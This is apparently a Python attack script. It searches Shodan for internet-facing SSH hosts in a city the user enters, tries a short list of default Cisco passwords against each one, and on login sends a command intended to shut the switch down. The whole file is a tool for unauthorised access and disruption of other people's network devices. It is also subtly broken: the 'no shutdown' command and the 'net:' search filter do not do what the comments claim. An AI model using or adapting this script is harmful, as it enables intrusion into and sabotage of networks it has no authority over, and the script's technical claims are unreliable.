import shodan
import paramiko


# Enter the API key for the Shodan.io account
SHODAN_API_KEY = "YOUR_API_KEY"

# Set up Shodan API client
api = shodan.Shodan(SHODAN_API_KEY)

def turn_off_switch(switch_ip, switch_username, switch_password):
    # Set up SSH client
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    success = False
    try:
        # Connect to switch using SSH
        ssh.connect(hostname=switch_ip, port=22, username=switch_username, password=switch_password, banner_timeout=60)

        # Turn off switch
        stdin, stdout, stderr = ssh.exec_command("no shutdown")

        print(f"The switch at {switch_ip} has been turned off.")
        success = True

    except Exception:
        return False

    finally:
        # Close SSH client
        ssh.close()

    return success


try:
    # Use Shodan API to search for switches in the city
    city = input("Enter the city where the switch is located: ")
    query = f"net:{city} port:22"
    results = api.search(query)

    # Extract switch IP, username, and password from search results
    for result in results['matches']:
        switch_ip = result['ip_str']
        switch_username = "cisco" #default username
        switch_passwords = ["cisco", "cisco123", "admin", "password"]
        
        for switch_password in switch_passwords:
            success = turn_off_switch(switch_ip, switch_username, switch_password)
            if success:
                break

except shodan.APIError as e:
    print(f"Error: {e}")
